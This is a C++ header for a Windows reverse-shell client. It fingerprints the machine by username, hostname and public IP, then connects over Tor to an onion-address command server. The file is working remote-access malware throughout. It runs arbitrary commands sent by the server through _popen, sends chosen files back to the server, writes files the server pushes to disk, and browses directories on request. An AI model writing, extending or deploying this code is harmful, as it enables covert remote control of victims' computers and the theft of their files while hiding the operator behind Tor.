#pragma once

#include "TorPlusPlus/torplusplus.hpp"

#include <Windows.h>
#include <lmcons.h>
#include <string>
#include <filesystem>
#include <vector>
#include <fstream>

// Using raw sockets (not the torSock) just for getting the public IP from amazonaws
#pragma comment(lib, "Ws2_32.lib")
#include <WinSock2.h>

#define torProxyPort 9051

/*
    Contains code for connecting to the server and processing commands
*/
class torRevShellClient {
private:
    torPlusPlus::TOR tor;
    torPlusPlus::TORSocket torSock;
    std::string torPath;
    std::string servAddr;
    unsigned int servPort = 0;
    std::string publicIp;
    std::string username;
    std::string hostname;
    bool connected = false;

    /*
        Get the public IP address to send to the server by making a GET request to checkip.amazonaws.com
        Obviously, this cant be done using TOR, so a normal socket is created.
        !!! There is a lack of error handling in this function
    */
    std::string getPublicIP() {
        std::string url = "checkip.amazonaws.com"; // The URL to ask nicely for our IP
        
        // Start winsocket crap
        WSADATA wsaData = { 0 };
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        // Set up the host, address, and socket:
        struct hostent* host = gethostbyname(url.c_str());
        struct sockaddr_in addr;
        addr.sin_addr.s_addr = *(u_long*)host->h_addr_list[0];
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80);
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        
        // Connect to the server and send the GET request
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        std::string req = "GET / HTTP/1.1\r\nHost: " + url + "\r\n\r\n";
        send(sock, req.c_str(), req.length(), 0);
        
        // Receive the response
        char buffer[1024];
        int bytesReceived = recv(sock, buffer, 1024, 0);
        
        // Clean up the socket
        closesocket(sock);
        WSACleanup();
        
        // Get the IP from the response (Hopefully its there!)
        std::string response(buffer, bytesReceived-1); //-1 removes last newline
        return response.substr(response.find_last_of('\n') + 1); // The IP is at the end of the response, after a newline.
    }

    
    /*
        Gets username, hostname, and public IP (via checkip.amazonaws.com)
        Stores them in the class variables to send to the server (for identification)
    */
    void getComputerInfo() {
        // Get the username of the current user:
        TCHAR usernameTC[UNLEN + 1]; // UNLEN is defined in Lmcons.h as 256 (maximum username length, apparently)
        DWORD usernameLen = UNLEN + 1;
        GetUserName(usernameTC, &usernameLen);
        std::wstring usernameWStr(&usernameTC[0]);
        this->username = std::string(usernameWStr.begin(), usernameWStr.end());
        
        // Get the computer hostname:
        DWORD hostnameLen = 16; // GetComputerName returns the NetBIOS name, which is 15 characters long (max)
        TCHAR hostnameTC[16]; // TCHAR is a dumb type and windows is silly >:(
        GetComputerName(hostnameTC, &hostnameLen); // Put the NetBIOS name into the hostnameTC buffer
        std::wstring hostnameWStr(&hostnameTC[0]); // Convert to a wstring, so it can then be converted into an std::string
        this->hostname = std::string(hostnameWStr.begin(), hostnameWStr.end()); // Convert to std::string and store in this->hostname

        // Get the public IP address:
        this->publicIp = this->getPublicIP(); // In its own function since it requires a bit more code than the above two
    }

    
public:
    /*
        Sets up some important variables.
        torPath: the path to tor.exe on disk.
        servAddr: the onion address of the server to connect to.
        Calls this->getComputerInfo() to get the username, hostname, and public IP of this computer.
    */
    torRevShellClient(std::string torPath, std::string servAddr, unsigned int servPort){
        this->torPath = torPath;
        this->servAddr = servAddr;
        this->servPort = servPort;
        this->getComputerInfo();
    }

    
    /*
        Attempts to start TOR using this->torPath.
        Does not connect to the proxy!
        Returns 0 on fail
    */
    bool startProxy() {
        this->tor.startFromFile(this->torPath);
        return 1; // startFromFile will block until successful connection is made
    }

    
    /*
        Attempts to make a connection to the server
        Returns true if a successful response from server is received ("<ip>;<username>;<hostname>;connected;")
    */
    bool attemptConnect() {
        // Start the proxy and connect to the server
        this->torSock.connectToProxy(); // Connect to the proxy, so we can then connect to the server through it
        printf("Attempting to connect to %s:%d\n", this->servAddr.c_str(), this->servPort);
        this->torSock.connectProxyTo(this->servAddr.c_str(), this->servPort);
        
        // Assemble and send the connection request
        std::string connReq = this->publicIp + ";" + this->username + ";" + this->hostname + ";"; // Format: <ip>;<username>;<hostname>;
        this->torSock.proxySend(connReq.c_str(), connReq.size());
        
        // Receive the response from the server
        char connResponseBuff[1024] = { 0 }; // 1kb is more than enough
        this->torSock.proxyRecv(connResponseBuff, 1024);
        printf("Received response: %s\n", connResponseBuff);
        
        // Process the response from the server
        std::string connResponse = connResponseBuff; // Convert to std::string for easier handling
        this->connected = (connResponse == this->publicIp + ";" + this->username + ";" + this->hostname + ";" + "connected;"); // Verify that the data the server sent back matches what we sent
        return this->connected;
    }
    
    
    /*
        This is essentially the "main()" for the server.
        Only runs if this->connected is true.
    */
    bool cmdProcess() {
        if (!this->connected) { // Return false immediately if not connected to the server
            return false;
        }
        char cmdBuff[1024] = { 0 }; // !! hard limits on command length arent epic
        int bytesReceived = this->torSock.proxyRecv(cmdBuff, 1024);
        if (bytesReceived <= 0) { // If receiving fails, assume the connection was lost
            return false;
        }
        std::string cmd = cmdBuff; // Convert for easier handling
        if (cmd == "ping;") {
            this->torSock.proxySend("ping;pong;");
        }
        else if (cmd.starts_with("cd;")) { // Change Directory
            this->cd(cmd.substr(3, cmd.size() - 4));
        }
        else if (cmd.starts_with("grab;")) { // Uploads a file to the server
            this->grab(cmd.substr(5, cmd.size() - 6));
        }
        else if (cmd.starts_with("upload;")) {
            this->upload(cmdBuff, bytesReceived); // Using raw buffer, because null bytes are a thing.
        }
        else if (cmd.starts_with("exec;")) { // Executes a command via _popen()
            this->exec(cmd.substr(5, cmd.size() - 6));
        }
        else if (cmd.starts_with("filebrowser;")) {
            this->fileBrowser(cmd.substr(12, cmd.size() - 12));
        }
        else {
            // If the command is unknown to the client, return an error message to the server
            this->torSock.proxySend(std::string("Received invalid command: ") + cmd);
        }
        return true;
    }

    /*
        ================ All the functions below this line are called by cmdProcess() ================
    */

    /*
        Handles all the requests made by the file browser on the server
        These are just commands to get the current dir, and a list of everything in it in a nice format that it can parse
    */
    void fileBrowser(std::string cmd){
        if (cmd.starts_with("gwd;")) {
            std::string cwd = std::filesystem::current_path().string();
            this->torSock.proxySend("filebrowser;gwd;" + cwd + ";");
        }
        else if (cmd.starts_with("ls;")) {
            std::string response = "filebrowser;ls;";
            try {
                for (const auto& f : std::filesystem::directory_iterator(".")) {
                    response.push_back(std::filesystem::is_directory(f) ? '1' : '0');
                    response += f.path().string();
                    response += ";";
                }
            }
            catch (...) { // An ugly way to handle the directory iterator failing :) (i could probably just do validation and then i wouldnt need to try-catch lol)
                response = "Filesystem error; " + cmd;
            }
            this->torSock.proxySend(response);
        }
        else {
            this->torSock.proxySend(std::string("Received invalid command; ") + cmd);
        }
    }

    /*
        Changes the current working directory of this executable to the one specified in the command
    */
    void cd(std::string path){
        std::wstring pathWStr(path.begin(), path.end()); // Convert to a wstring because windows is cringe
        BOOL success = SetCurrentDirectory(pathWStr.c_str()); // Attempt to change the current working directory
        this->torSock.proxySend("cd;" + path + ((success) ? ";success;" : ";failed;")); // Send the appropriate response to the server
    }

    /*
        grab() is used by the server to retreive a file at the given path from the client
        Response format: "grab;<path>;<file size>;<raw file data>"
    */
    void grab(std::string path) {
        std::ifstream f(path.c_str(), std::ios::binary); // Open the file in binary mode
        if (f.is_open() != true) {
            this->torSock.proxySend("grab;" + path + ";0;ERR"); // If the file could not be opened, send an error message to the server
        }
        else {
            std::string responseStr = "grab;" + path + ";" + std::to_string(std::filesystem::file_size(path)) + ";"; // Assemble the plaintext part of the response
            std::vector<char> responseBytes; // Create a vector to store the raw bytes of the response (cant use an std::string because it cant store null bytes)
            responseBytes.reserve(responseStr.size() + std::filesystem::file_size(path)); // Reserve enough space for the plaintext part of the response and the file data (slight performance boost maybe)
            responseBytes.insert(responseBytes.end(), responseStr.begin(), responseStr.end()); // Insert the plaintext part of the response into the vector
            // The following loop probably isnt very speedy due to calling push_back() a lot, but it works. (the speed of the TOR network is a much more significant bottleneck, so this is fine)
            for (char c; f.get(c);) {
                responseBytes.push_back(c);
            }
            this->torSock.proxySend(responseBytes.data(), responseBytes.size()); // Send the bytes to the server
        }
    }

    /*
        upload() is used by the server to place a file onto the client
        Request format: "upload;<file name>;<file size>;<raw file data>"
        Response format: "upload;<file name>;<success/failed>"
    */
    void upload(char* b, unsigned int bytesReceivedInitial) {
        // Read the plaintext header containing the file name and size
        std::string bStr(b);
        int fileNameEnd = bStr.find(";", 7); // The index of the end of the filename is at the first ";" after "upload;"
        std::string fileName = bStr.substr(7, fileNameEnd - 7);
        unsigned long int fileSize = std::stoi(bStr.substr(fileNameEnd + 1, bStr.find(";", fileNameEnd + 1) - fileNameEnd - 1)); // An unsafe way of parsing the fileSize from the request
        unsigned int headerSize = 7 + fileName.size() + 1 + std::to_string(fileSize).size() + 1; // 7 = "upload;", 1 = ";", 1 = ";"
        
        // Read the binary file data from the server
        std::vector<char> fileData;
        fileData.reserve(fileSize); // Reserve enough space for the whole file in the std::vector
        unsigned bytesReceivedTotal = bytesReceivedInitial - headerSize; // Store the number of bytes of data received so far (in the first 1024 bytes that was read by cmdProcess())
        printf("Received upload for %d bytes of data, filename: %s\n", fileSize, fileName.c_str());
        fileData.insert(fileData.end(), b + headerSize, b + bytesReceivedInitial); // Insert the first chunk of bytes into the fileData vector
        while (bytesReceivedTotal < fileSize) { // While we havent received the entire file, keep reading from the socket and pushing data back onto fileData
            char b[1024] = { 0 };
            unsigned int bytesReceived = this->torSock.proxyRecv(b, 1024);
            fileData.insert(fileData.end(), b, b + bytesReceived);
            bytesReceivedTotal += bytesReceived;
        }

        // Write the data to the disk
        std::ofstream f(fileName.c_str(), std::ios::binary); // Open a file with the fileName sent by the server in binary mode
        if (f.is_open() != true) { // If opening the file failed for whatever reason, send a failure message back to the server
            this->torSock.proxySend("upload;" + fileName + ";failed;");
        }
        else {
            f.write(fileData.data(), fileData.size()); // Slap that data onto the disk
            this->torSock.proxySend("upload;" + fileName + ";success;"); // Send a success message back to the server
        }
        f.close();
    }

    /*
        Executes the given cmd via _popen()
    */
    void exec(std::string cmd) {
        std::string response;
        FILE* pipe = _popen(cmd.c_str(), "r"); // The FILE* can be used to retreive the output of the command
        if (!pipe) {
            response += "failed;";
        }
        else {
            // Read from the pipe 128 bytes at a time until theres nothing left. Add everything onto the response string
            char buffer[128];
            while (!feof(pipe)) {
                if (fgets(buffer, 128, pipe) != NULL) {
                    response += buffer;
                }
            }
            _pclose(pipe);
        }
        if (response.size() == 0) {
            this->torSock.proxySend("exec;" + cmd + ";0;;");
        }
        else {
            this->torSock.proxySend("exec;" + cmd + ";" + std::to_string(response.size() - 1) + ";" + response + ";");
        }
    }
    
};